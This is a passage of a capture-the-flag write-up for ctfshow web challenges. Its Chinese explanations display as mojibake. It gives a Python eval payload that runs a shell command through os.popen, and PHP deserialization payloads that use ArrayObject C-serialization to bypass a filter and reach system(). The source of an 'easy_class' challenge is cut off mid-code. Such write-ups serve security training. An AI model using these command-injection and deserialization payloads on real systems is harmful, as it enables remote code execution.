</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span> <span class="o">=</span> <span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="mi">8080</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="2payload">2.payload</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">URL+/hello/?eval=__import__(&#34;os&#34;).popen(&#34;cat /flag_is_h3re&#34;).read()
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="easy_php">easy_php</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ctfshow</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;not allowed!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ctfshow</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$data</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;1+1&gt;2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/^[Oa]:[\d]+/i&#34;</span><span class="p">,</span> <span class="nv">$data</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">    <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h4 id="1é¢˜ç›®åˆ†æ">1.é¢˜ç›®åˆ†æ</h4>
<p>åªè¦æ‰§è¡Œ<code>__destruct()</code>ä¸­çš„<code>system</code>å‡½æ•°ï¼Œç»™<code>ctfshow</code>èµ‹å€¼å³å¯</p>
<p>ä½†æ˜¯å¯¹dataè¿›è¡Œäº†è¿‡æ»¤ï¼Œä¸èƒ½ä¼ å…¥ä»¥Oå’Œaå¼€å¤´çš„åºåˆ—åŒ–å€¼,ä¹Ÿå°±æ˜¯å¯¹è±¡å’Œæ•°ç»„çš„åºåˆ—åŒ–å€¼ã€‚</p>
<p>æ„Ÿè§‰è¿™ä¸ªé¢˜çš„éš¾ç‚¹ï¼Œå°±æ˜¯ä¸å¤ªä¼šç»•è¿‡Oaï¼Œ</p>
<p>é¢˜ç›®ä¸­çš„ctfshowç±»æœªå®ç°serializableæ¥å£ï¼Œæ‰€ä»¥ä¸èƒ½è§£æè¯¥å±æ€§ã€‚æ‰€ä»¥æ‰¾phpä¸­å†…ç½®çš„å®ç°äº†Serializableæ¥å£çš„ç±»</p>
<p>wpä½¿ç”¨äº†ArrayObject()ç±»ï¼Œä½¿ç”¨è¿™ä¸ªç±»å»ä¿®é¥°ctfshowç±»</p>
<h4 id="2çŸ¥è¯†ç‚¹-2">2.çŸ¥è¯†ç‚¹</h4>
<ul>
<li>
<h5 id="oæ ‡è¯†ç¬¦ä»£è¡¨å¯¹è±¡ç±»å‹è€Œcæ ‡è¯†ç¬¦ä»£è¡¨ç±»åç±»å‹å¦‚æœå°†oæ›¿æ¢ä¸ºcåˆ™åœ¨ååºåˆ—åŒ–æ—¶ä¼šå°†å…¶è§£é‡Šä¸ºä¸€ä¸ªæ–°çš„ç±»åå­—ç¬¦ä¸²ä»è€Œåˆ›å»ºä¸€ä¸ªæ–°çš„ç±»è€Œä¸æ˜¯å¯¹è±¡å› ä¸ºè¿™ä¸ªæ–°çš„ç±»æ²¡æœ‰è¢«åºåˆ—åŒ–è¿‡æ‰€ä»¥å®ƒæ²¡æœ‰ä»»ä½•å±æ€§æˆ–æ–¹æ³•å› æ­¤åœ¨ååºåˆ—åŒ–æ—¶__wakeupç­‰ä¸€äº›é­”æœ¯æ–¹æ³•å°±ä¸ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ä½†æ˜¯å¯ä»¥åˆ©ç”¨æœ‰æ¥å£serializableçš„ç±»æ¥è¿›è¡Œä¿®é¥°ä»è€Œå¯ä»¥åˆ©ç”¨é­”æœ¯æ–¹æ³•æ¯”å¦‚arrayobjectç±»">Oæ ‡è¯†ç¬¦ä»£è¡¨å¯¹è±¡ç±»å‹ï¼Œè€ŒCæ ‡è¯†ç¬¦ä»£è¡¨ç±»åç±»å‹ã€‚å¦‚æœå°†Oæ›¿æ¢ä¸ºCï¼Œåˆ™åœ¨ååºåˆ—åŒ–æ—¶ä¼šå°†å…¶è§£é‡Šä¸ºä¸€ä¸ªæ–°çš„ç±»åå­—ç¬¦ä¸²ï¼Œä»è€Œåˆ›å»ºä¸€ä¸ªæ–°çš„ç±»è€Œä¸æ˜¯å¯¹è±¡ã€‚å› ä¸ºè¿™ä¸ªæ–°çš„ç±»æ²¡æœ‰è¢«åºåˆ—åŒ–è¿‡ï¼Œæ‰€ä»¥å®ƒæ²¡æœ‰ä»»ä½•å±æ€§æˆ–æ–¹æ³•ã€‚å› æ­¤åœ¨ååºåˆ—åŒ–æ—¶ï¼Œ__wakeupç­‰ä¸€äº›é­”æœ¯æ–¹æ³•å°±ä¸ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚ä½†æ˜¯å¯ä»¥åˆ©ç”¨æœ‰æ¥å£Serializableçš„ç±»ï¼Œæ¥è¿›è¡Œä¿®é¥°ï¼Œä»è€Œå¯ä»¥åˆ©ç”¨é­”æœ¯æ–¹æ³•ã€‚æ¯”å¦‚ArrayObjectç±»ã€‚</h5>
</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">O:6:&#34;Person&#34;:2:{s:3:&#34;age&#34;;i:18;s:4:&#34;name&#34;;s:3:&#34;lxy&#34;;}
</span></span><span class="line"><span class="cl">â€œOâ€ï¼šå¯¹è±¡
</span></span><span class="line"><span class="cl">â€œ6â€ï¼šå¯¹è±¡çš„ç±»åé•¿åº¦
</span></span><span class="line"><span class="cl">â€œPersonâ€ï¼šå¯¹è±¡å
</span></span><span class="line"><span class="cl">â€œ2â€ï¼šå¯¹è±¡ä¸­æœ‰2ä¸ªå˜é‡ã€‚
</span></span><span class="line"><span class="cl">s:4:&#34;name&#34;;s:3:&#34;lxy&#34;ï¼š
</span></span><span class="line"><span class="cl">â€œsâ€ï¼šå˜é‡ç±»å‹ï¼Œä¸ºstringå¯¹è±¡ï¼›s:4:&#34;name&#34;ï¼šå˜é‡åé•¿åº¦å’Œå˜é‡åï¼Œ
</span></span><span class="line"><span class="cl">s:3:&#34;lxy&#34;ï¼šå˜é‡çš„å€¼å’Œå€¼çš„é•¿åº¦ã€‚
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>
<h5 id="åœ¨phpä½ç‰ˆæœ¬ä¸­oæˆ–açš„å†’å·åçš„æ•°å­—å‰å¯ä»¥åŠ ä¸€ä¸ªæ¥è¿›è¡Œç»•è¿‡é¢˜ç›®ç‰ˆæœ¬73æ— æ³•ç»•è¿‡">åœ¨phpä½ç‰ˆæœ¬ä¸­ï¼ŒOæˆ–açš„å†’å·åçš„æ•°å­—å‰å¯ä»¥åŠ ä¸€ä¸ª+æ¥è¿›è¡Œç»•è¿‡ï¼Œé¢˜ç›®ç‰ˆæœ¬7.3æ— æ³•ç»•è¿‡ã€‚</h5>
</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">C:11:&#34;ArrayObject&#34;:37:{x:i:0;a:2:{i:0;i:0;i:1;i:1;};m:a:0:{}}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">37ï¼šæ‹¬å·å†…çš„å­—ç¬¦æ•°
</span></span><span class="line"><span class="cl">x:i:0;ï¼šç»“æ„ä¸­çš„nr_flagså­—æ®µ
</span></span><span class="line"><span class="cl">a:2:{i:0;i:0;i:1;i:1;}ï¼šç»“æ„ä¸­çš„æ•°ç»„å­—æ®µ(ä»è¿™ä¸ªè§’åº¦,å®ƒè¢«ç§°ä¸ºinternalæ•°ç»„ä»¥åŒºåˆ«äºå¯¹è±¡æœ¬èº«)
</span></span><span class="line"><span class="cl">m:a:0:{}ï¼šzend_object stdå­—æ®µå†…çš„propertieså­—æ®µ(ä»è¿™ä¸ªè§’åº¦,ç§°ä¸ºmembersæ•°ç»„)ã€‚
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="3payload-3">3.payload</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1"># payload1:å®˜æ–¹
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="mi">1</span><span class="o">%</span><span class="mi">2</span><span class="nx">b1</span><span class="o">&gt;</span><span class="mi">2</span><span class="o">=</span><span class="nx">C</span><span class="o">:</span><span class="mi">11</span><span class="o">:</span><span class="s2">&#34;ArrayObject&#34;</span><span class="o">:</span><span class="mi">67</span><span class="o">:</span><span class="p">{</span><span class="nx">x</span><span class="o">:</span><span class="nx">i</span><span class="o">:</span><span class="mi">0</span><span class="p">;</span><span class="nx">O</span><span class="o">:</span><span class="mi">7</span><span class="o">:</span><span class="s2">&#34;ctfshow&#34;</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">7</span><span class="o">:</span><span class="s2">&#34;ctfshow&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">12</span><span class="o">:</span><span class="s2">&#34;cat /f1agaaa&#34;</span><span class="p">;};</span><span class="nx">m</span><span class="o">:</span><span class="nx">a</span><span class="o">:</span><span class="mi">0</span><span class="o">:</span><span class="p">{}}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># payload2:
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="mi">1</span><span class="o">%</span><span class="mi">2</span><span class="nx">b1</span><span class="o">&gt;</span><span class="mi">2</span><span class="o">=</span><span class="nx">C</span><span class="o">:</span><span class="mi">11</span><span class="o">:</span><span class="s2">&#34;ArrayObject&#34;</span><span class="o">:</span><span class="mi">87</span><span class="o">:</span><span class="p">{</span><span class="nx">x</span><span class="o">:</span><span class="nx">i</span><span class="o">:</span><span class="mi">0</span><span class="p">;</span><span class="nx">a</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">7</span><span class="o">:</span><span class="s2">&#34;ctfshow&#34;</span><span class="p">;</span><span class="nx">O</span><span class="o">:</span><span class="mi">7</span><span class="o">:</span><span class="s2">&#34;ctfshow&#34;</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">7</span><span class="o">:</span><span class="s2">&#34;ctfshow&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">12</span><span class="o">:</span><span class="s2">&#34;cat /f1agaaa&#34;</span><span class="p">;}};</span><span class="nx">m</span><span class="o">:</span><span class="nx">a</span><span class="o">:</span><span class="mi">0</span><span class="o">:</span><span class="p">{}}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ctfshow</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">public</span> <span class="nv">$ctfshow</span> <span class="o">=</span> <span class="s1">&#39;cat /f1agaaa&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$ctfshow_obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ctfshow</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$array_obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayObject</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$array_obj</span><span class="p">[</span><span class="s1">&#39;ctfshow&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$ctfshow_obj</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$serialized_str</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$array_obj</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$serialized_str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// C:11:&#34;ArrayObject&#34;:87:{x:i:0;a:1:{s:7:&#34;ctfshow&#34;;O:7:&#34;ctfshow&#34;:1:{s:7:&#34;ctfshow&#34;;s:12:&#34;cat /f1agaaa&#34;;}};m:a:0:{}}
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// é¦–å…ˆï¼Œå®šä¹‰äº†ä¸€ä¸ªåä¸º ctfshow çš„ç±»ï¼Œå¹¶åœ¨å…¶ä¸­å®šä¹‰äº†ä¸€ä¸ªåä¸º ctfshow çš„å…¬å…±å±æ€§ï¼Œå…¶å€¼ä¸ºcat /f1agaaaã€‚ç„¶åï¼Œå®ä¾‹åŒ– ctfshow ç±»ï¼Œå°†å…¶èµ‹å€¼ç»™ $array_obj å¯¹è±¡çš„ ctfshow å±æ€§ã€‚
</span></span></span><span class="line"><span class="cl"><span class="c1">// æ³¨æ„ï¼Œå› ä¸º $array_obj æ˜¯ä¸€ä¸ª ArrayObject å¯¹è±¡ï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨æ•°ç»„çš„å½¢å¼æ¥èµ‹å€¼ï¼Œå³ $array_obj[&#39;ctfshow&#39;]ã€‚
</span></span></span><span class="line"><span class="cl"><span class="c1">// æœ€åï¼Œä½¿ç”¨ serialize() å‡½æ•°å°† $array_obj åºåˆ—åŒ–ä¸ºå­—ç¬¦ä¸²ï¼Œå¹¶å°†å…¶è¾“å‡ºã€‚
</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="easy_class">easy_class</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">ctfshow</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">C</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="no">__REF_OFFSET_1</span> <span class="o">=</span> <span class="mh">0x41</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="no">__REF_OFFSET_2</span> <span class="o">=</span> <span class="mh">0x7b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="no">__REF_OFFSET_3</span> <span class="o">=</span> <span class="mh">0x5b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="no">__REF_OFFSET_4</span> <span class="o">=</span> <span class="mh">0x60</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="no">__REF_OFFSET_5</span> <span class="o">=</span> <span class="mh">0x30</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="no">__REF_OFFSET_6</span> <span class="o">=</span> <span class="mh">0x5f</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="no">__REF_SIZE__</span><span class="o">=</span> <span class="mi">20</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="no">__REF_VAL_SIZE__</span><span class="o">=</span> <span class="mi">50</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$cursor</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$cache</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$ref_table</span><span class="o">=</span><span class="p">[];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">main</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$flag</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;/flag&#34;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">define</span><span class="p">(</span><span class="s1">&#39;ctfshow&#39;</span><span class="p">,</span><span class="nx">self</span><span class="o">::</span><span class="na">__REF_VAL_SIZE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">define</span><span class="p">(</span><span class="s1">&#39;flag&#39;</span><span class="p">,</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$flag</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">neaten</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fill</span><span class="p">(</span><span class="s1">&#39;flag&#39;</span><span class="p">,</span><span class="nv">$flag</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fill</span><span class="p">(</span><span class="s1">&#39;ctfshow&#39;</span><span class="p">,</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">read</span><span class="p">(</span><span class="s1">&#39;ctfshow&#39;</span><span class="p">)</span><span class="o">===</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">read</span><span class="p">(</span><span class="s1">&#39;flag&#39;</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="k">function</span> <span class="nf">fill</span><span class="p">(</span><span class="nv">$ref</span><span class="p">,</span><span class="nv">$val</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nx">rewind</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">fseek</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ref_table</span><span class="p">[</span><span class="nv">$ref</span><span class="p">]</span><span class="o">+</span><span class="mi">23</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$arr</span> <span class="o">=</span> <span class="nx">str_split</span><span class="p">(</span><span class="nv">$val</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$arr</span> <span class="k">as</span> <span class="nv">$s</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">,</span> <span class="nx">pack</span><span class="p">(</span><span class="s2">&#34;C&#34;</span><span class="p">,</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$s</span><span class="p">)));</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="nx">sizeof</span><span class="p">(</span><span class="nv">$arr</span><span class="p">);</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">self</span><span class="o">::</span><span class="na">__REF_VAL_SIZE__</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
